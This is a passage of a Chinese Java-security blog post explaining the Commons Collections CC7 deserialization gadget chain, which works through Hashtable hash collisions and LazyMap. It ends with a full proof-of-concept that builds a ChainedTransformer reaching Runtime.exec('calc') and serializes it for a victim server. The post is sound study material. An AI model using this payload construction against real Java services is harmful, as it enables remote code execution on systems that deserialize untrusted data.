+<li><strong>实际动作</strong>：这是**“凶手”**。它在对比过程中，拿 <code>hashMap1</code> 里的 key (“yy”)，去调用传入参数 <code>m</code> (即 <code>lazyMap2</code>) 的 <code>get(&quot;yy&quot;)</code>。</li>
+</ul>
+</li>
+</ol>
+<p>最后一步 <code>AbstractMap#equals</code> 里，是谁调用的 <code>get</code></p>
+<p>在 <code>AbstractMap.equals(Object o)</code> 源码中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="comment">// ... 前面的检查 ...</span></span><br><span class="line">    Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o; <span class="comment">// 这里的 m 就是 lazyMap2</span></span><br><span class="line"></span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">        Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey(); <span class="comment">// 这里取出的 key 是 &quot;yy&quot; (来自 lazyMap1)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 【核心触发点】</span></span><br><span class="line">        <span class="comment">// 这里的 m 是 lazyMap2</span></span><br><span class="line">        <span class="comment">// 所以这里执行的是 lazyMap2.get(&quot;yy&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!value.equals(m.get(key))) <span class="comment">// &lt;--- 炸弹在这里引爆</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="C、remove方法"><a href="#C、remove方法" class="headerlink" title="C、remove方法"></a>C、<code>remove</code>方法</h4><p>当在本地执行 <code>hashtable.put(lazyMap2, 1)</code> 时，由于哈希碰撞触发了 <code>equals</code>，导致 <code>AbstractMap</code> 调用了 <code>lazyMap2.get(&quot;yy&quot;)</code>。</p>
+<p>这时候，<code>LazyMap</code> 内部发生了如下反应：</p>
+<ol>
+<li><strong><code>if (map.containsKey(&quot;yy&quot;) == false)</code></strong>：<ul>
+<li>此时 <code>lazyMap2</code> 只有 <code>&quot;zZ&quot;</code>，没有 <code>&quot;yy&quot;</code>。</li>
+<li>条件成立，进入 <code>if</code> 内部。</li>
+</ul>
+</li>
+<li><strong><code>Object value = factory.transform(&quot;yy&quot;)</code></strong>：<ul>
+<li>这里的 <code>factory</code> 就是你构造的 <code>ChainedTransformer</code>。</li>
+<li>如果是本地调试（没把 Transformer 设为空），这里就已经弹出计算器了。</li>
+<li><code>value</code> 变成了 Transformer 执行后的结果（通常是一个对象或者 Process 结果）。</li>
+</ul>
+</li>
+<li><strong><code>map.put(&quot;yy&quot;, value)</code> (这就是你要找的代码！)</strong>：<ul>
+<li><strong>注意！</strong> <code>LazyMap</code> 并没有把这个值用完即弃，而是<strong>永久性地存入了自己的 HashMap 中</strong>。</li>
+<li>从这一刻起，<code>lazyMap2</code> 的肚子里就多了一个键值对：<code>&quot;yy&quot; -&gt; value</code>。</li>
+</ul>
+</li>
+<li><strong><code>return value</code></strong>：<ul>
+<li>返回结果，方法结束。</li>
+</ul>
+</li>
+</ol>
+<p>对应<code>get</code>方法源码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 先检查：如果不包含这个 key</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2.【触发命令执行】调用 factory (即 Transformer) 创建值</span></span><br><span class="line">        <span class="comment">// 如果是攻击链，这里就会执行 exec(&quot;calc&quot;)</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3.【关键污染点！把新值塞进肚子里】</span></span><br><span class="line">        <span class="comment">// 这一步就是为什么你需要 remove(&quot;yy&quot;) 的原因</span></span><br><span class="line">        map.put(key, value); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 返回新创建的值</span></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果 key 存在，就正常获取</span></span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>map.put(key, value)</code> 会改变 Map 的结构。在本地构造 Payload 的过程中，这个副作用会导致 Payload 被“污染”（多出了不该有的 Key）。如果不手动 <code>remove</code> 掉，发给受害者时，受害者一查发现“咦，你有 ‘yy’ 啊”，就不会走进这个 <code>if</code> 语句，也就永远走不到 <code>factory.transform</code> 这一行了。</p>
+<p><strong>状态图</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>步骤</strong></th>
+<th><strong>LazyMap2 的状态</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1. 初始化</td>
+<td><code>{&quot;zZ&quot;: 1}</code></td>
+<td>初始纯净状态</td>
+</tr>
+<tr>
+<td>2. <code>hashtable.put()</code></td>
+<td><code>{&quot;zZ&quot;: 1, &quot;yy&quot;: obj}</code></td>
+<td><strong>被污染！</strong> 本地触发了一次 get，自动生成了 yy</td>
+</tr>
+<tr>
+<td>3. <strong>如果直接序列化</strong></td>
+<td><code>{&quot;zZ&quot;: 1, &quot;yy&quot;: obj}</code></td>
+<td>发送给对方的是脏数据</td>
+</tr>
+<tr>
+<td>4. 对方反序列化执行 <code>get(&quot;yy&quot;)</code></td>
+<td><strong>直接返回 obj</strong></td>
+<td>因为有了 yy，就不触发漏洞逻辑了</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>正确的做法</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>3. <code>lazyMap2.remove(&quot;yy&quot;)</code></td>
+<td><code>{&quot;zZ&quot;: 1}</code></td>
+<td><strong>恢复纯净</strong>，重置陷阱</td>
+</tr>
+<tr>
+<td>4. 序列化发送</td>
+<td><code>{&quot;zZ&quot;: 1}</code></td>
+<td>发送干净数据</td>
+</tr>
+<tr>
+<td>5. 对方反序列化执行 <code>get(&quot;yy&quot;)</code></td>
+<td><strong>触发 Transformer</strong></td>
+<td>因为没有 yy，LazyMap 才会去执行命令</td>
+</tr>
+</tbody></table>
+<h4 id="D、调用的get方法"><a href="#D、调用的get方法" class="headerlink" title="D、调用的get方法"></a>D、调用的<code>get</code>方法</h4><p><strong>lazyMap2</strong></p>
+<p><strong>第一幕：还原 Hashtable（开箱）</strong></p>
+<p>受害者服务器开始读取 <code>ser.bin</code>。</p>
+<ol>
+<li><strong>读取第一个对象</strong>：它读到了 <code>lazyMap1</code>（那个持有 <code>&quot;yy&quot;</code> 钥匙的警察）。<ul>
+<li>服务器把它放进新建的 <code>Hashtable</code> 的 5 号柜子（假设 Hash 是 5）。</li>
+<li>此时柜子是空的，直接放入。<strong>平安无事</strong>。</li>
+</ul>
+</li>
+<li><strong>读取第二个对象</strong>：它读到了 <code>lazyMap2</code>（那个被清空了 <code>&quot;yy&quot;</code> 且身怀炸弹的嫌疑人）。<ul>
+<li>服务器计算它的 Hash，发现也是 5。</li>
+<li>服务器准备把它也放进 5 号柜子。</li>
+</ul>
+</li>
+</ol>
+<p><strong>第二幕：碰撞与盘查（触发点）</strong></p>
+<p>因为 5 号柜子里已经有人了（<code>lazyMap1</code>），<code>Hashtable</code> 内部的代码（<code>reconstitutionPut</code>）立刻警觉起来：</p>
+<ul>
+<li><strong>Hashtable</strong>：“同一个柜子不能放重复的 Key，我得检查一下这俩是不是同一个东西。”</li>
+<li><strong>动作</strong>：调用 <code>e.key.equals(key)</code>。<ul>
+<li><code>e.key</code> 是柜子里坐着的 <code>lazyMap1</code>。</li>
+<li><code>key</code> 是新来的 <code>lazyMap2</code>。</li>
+</ul>
+</li>
+<li><strong>执行代码</strong>：<code>lazyMap1.equals(lazyMap2)</code>。</li>
+</ul>
+<p><strong>第三幕：借刀杀人（AbstractMap 逻辑）</strong></p>
+<p>代码进入 <code>AbstractMap.equals()</code>。这是 <code>lazyMap1</code> 的主场。</p>
+<ol>
+<li><strong>lazyMap1</strong>：“既然要比，那就拿我的清单来比。”</li>
+<li><strong>遍历</strong>：<code>lazyMap1</code> 拿出了它唯一的一个 Key —— <strong><code>&quot;yy&quot;</code></strong>。<ul>
+<li><em>注：这个 Key 是我们在 Payload 构造阶段保留下来的，没有被 remove。</em></li>
+</ul>
+</li>
+<li><strong>质问</strong>：<code>lazyMap1</code> 指着 <code>lazyMap2</code> 问：“你有没有 <strong><code>&quot;yy&quot;</code></strong> 对应的值？拿出来！”</li>
+<li><strong>执行代码</strong>：<strong><code>lazyMap2.get(&quot;yy&quot;)</code></strong>。</li>
+</ol>
+<p><strong>第四幕：引爆（LazyMap 逻辑）</strong></p>
+<p>这是最关键的一刻。代码跳转到了 <code>lazyMap2</code> 的 <code>get</code> 方法中。</p>
+<ol>
+<li><strong>检查库存</strong>：<code>lazyMap2</code> 翻了一下自己的口袋。<ul>
+<li><em>回想一下</em>：我们在发送前专门执行了 <code>lazyMap2.remove(&quot;yy&quot;)</code>。</li>
+<li><strong>结果</strong>：<strong>找不到 <code>&quot;yy&quot;</code>！</strong></li>
+</ul>
+</li>
+<li><strong>触发后门</strong>：<ul>
+<li><code>LazyMap</code> 的逻辑是：“没有？那我就造一个。”</li>
+<li>它调用 <code>factory.transform(&quot;yy&quot;)</code>。</li>
+</ul>
+</li>
+<li><strong>核爆</strong>：<ul>
+<li>这里的 <code>factory</code> 是什么？</li>
+<li><strong>回想一下</strong>：我们在发送前通过反射，把 <code>lazyMap2</code> 的 <code>factory</code> 替换成了恶意的 <code>finalChainedTransformer</code>。</li>
+<li><strong>结果</strong>：<strong><code>Runtime.exec(&quot;calc&quot;)</code> 被执行。</strong></li>
+</ul>
+</li>
+</ol>
+<h4 id="E、意外点"><a href="#E、意外点" class="headerlink" title="E、意外点"></a>E、意外点</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span>  <span class="operator">=</span> LazyMap.lazyMap(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(map2,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">2</span>));</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里</p>
+<p><code>obj2.put(lazyMap1, 1)</code>：成功放入。</p>
+<p><code>obj2.put(lazyMap2, 1)</code>：发生 Hash 碰撞，触发 <code>lazyMap1.equals(lazyMap2)</code>。</p>
+<p><strong>比较过程</strong>：</p>
+<ul>
+<li><code>lazyMap1</code> 拿出 <code>&quot;yy&quot;</code> (值为 1)。</li>
+<li>去问 <code>lazyMap2</code>：<code>lazyMap2.get(&quot;yy&quot;)</code>。</li>
+<li><code>lazyMap2</code> 没货，调用 Transformer，返回 <strong>1</strong>。</li>
+<li><code>AbstractMap</code> 比较：<code>lazyMap1</code> 的 1 <strong>等于</strong> <code>lazyMap2</code> 返回的 1。</li>
+<li><strong>结论</strong>：<code>equals</code> 返回 <strong><code>true</code></strong>。</li>
+</ul>
+<p><strong>Hashtable 的决定</strong>：</p>
+<ul>
+<li>“这俩是一样的嘛！”</li>
+<li><strong>结果</strong>：Hashtable 并没有存入两个 Map，而是<strong>合并</strong>成了一个。</li>
+</ul>
+<h3 id="3-最终poc"><a href="#3-最终poc" class="headerlink" title="3.最终poc"></a>3.最终poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chaun0,chuan1,chuan2,chuan3&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span>  <span class="operator">=</span> LazyMap.lazyMap(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(map2,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">2</span>));</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">obj2.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">obj2.put(lazyMap2,<span class="number">1</span>);</span><br><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">setFieldValue(lazyMap2,<span class="string">&quot;factory&quot;</span>,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(chuan));</span><br><span class="line"></span><br><span class="line">serialize(obj2);</span><br><span class="line">unserialize();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>成功</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272237262.png" alt="image-20260127223721047"></p>
+<p><strong>到这里 CC 链也就结束啦，下图是总结</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601282346732.png" alt="Commons Collections_chuan"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/">chuanchuan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/2026/01/28/CC5-7-Gadget/">https://zc-18.github.io/2026/01/28/CC5-7-Gadget/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://zc-18.github.io/" target="_blank">十七.</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/CC%E9%93%BE/">CC链</a></div><div class="post-share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/28/CC2-Gadget/" title="java安全-CC2"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/1.webp" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java安全-CC2</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC2，在CC4逻辑上修改的后半段，没有使用数组的CC链。</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/06/CC1-Chain/" title="java安全-CC1"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010123487.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-06</div><div class="info-item-2">java安全-CC1</div></div><div class="info-2"><div class="info-item-1">java安全中CC1链，这个链是jdk8u71之前的漏洞，能达到getshell的效果。</div></div></div></a><a class="pagination-related" href="/2026/01/15/CC1_plus-chain/" title="java安全-CC1进阶"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010121260.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-15</div><div class="info-item-2">java安全-CC1进阶</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC1_plus，主要分析了官方ysoserial的LazyMap链，并且研究了jdk8u71版本后CC1失效的原因</div></div></div></a><a class="pagination-related" href="/2026/01/28/CC2-Gadget/" title="java安全-CC2"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/1.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">java安全-CC2</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC2，在CC4逻辑上修改的后半段，没有使用数组的CC链。</div></div></div></a><a class="pagination-related" href="/2026/01/28/CC4-Gadget/" title="java安全-CC4"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191215.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">java安全-CC4</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC4，一条新的Commons Collections4.0版本下的入口链。</div></div></div></a><a class="pagination-related" href="/2026/01/28/CC3-Gadget/" title="java安全-CC3"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191207.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">java安全-CC3</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC3，使用类加载的方式，实现RCE。</div></div></div></a><a class="pagination-related" href="/2026/01/15/CC6-chain/" title="java安全-CC6"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010126234.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-15</div><div class="info-item-2">java安全-CC6</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC6，用来解决CC1在jdk8u71版本后不能用的问题。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="author-info-name">chuanchuan</div><div class="author-info-description">慢吞吞的小孩也会有自己的玫瑰海.</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zc-18/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/zc-18/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/2401_87508420" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2890792376@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A8-CC5-CC7"><span class="toc-text">java安全-CC5&amp;CC7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81CC5"><span class="toc-text">一、CC5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E8%A6%81%E9%80%BB%E8%BE%91"><span class="toc-text">1.主要逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BadAttributeValueExpException-readObject"><span class="toc-text">BadAttributeValueExpException#readObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry-toString"><span class="toc-text">TiedMapEntry#toString</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry-getValue"><span class="toc-text">TiedMapEntry#getValue</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-poc"><span class="toc-text">2.poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CC7"><span class="toc-text">二、CC7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%B3%E9%94%AE%E7%B1%BB"><span class="toc-text">1.关键类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hashtable-readObject"><span class="toc-text">Hashtable#readObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hashtable-reconstitutionPut"><span class="toc-text">Hashtable#reconstitutionPut</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AbstractMap-equals"><span class="toc-text">AbstractMap#equals</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%BB%E8%A6%81%E9%80%BB%E8%BE%91"><span class="toc-text">2.主要逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#A%E3%80%81reconstitutionPut%E6%96%B9%E6%B3%95"><span class="toc-text">A、reconstitutionPut方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#B%E3%80%81AbstractMap-equals%E6%96%B9%E6%B3%95%E9%80%BB%E8%BE%91"><span class="toc-text">B、AbstractMap#equals方法逻辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#C%E3%80%81remove%E6%96%B9%E6%B3%95"><span class="toc-text">C、remove方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#D%E3%80%81%E8%B0%83%E7%94%A8%E7%9A%84get%E6%96%B9%E6%B3%95"><span class="toc-text">D、调用的get方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#E%E3%80%81%E6%84%8F%E5%A4%96%E7%82%B9"><span class="toc-text">E、意外点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9C%80%E7%BB%88poc"><span class="toc-text">3.最终poc</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/28/CC5-7-Gadget/" title="java安全-CC5&amp;CC7"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-CC5&amp;CC7"/></a><div class="content"><a class="title" href="/2026/01/28/CC5-7-Gadget/" title="java安全-CC5&amp;CC7">java安全-CC5&amp;CC7</a><time 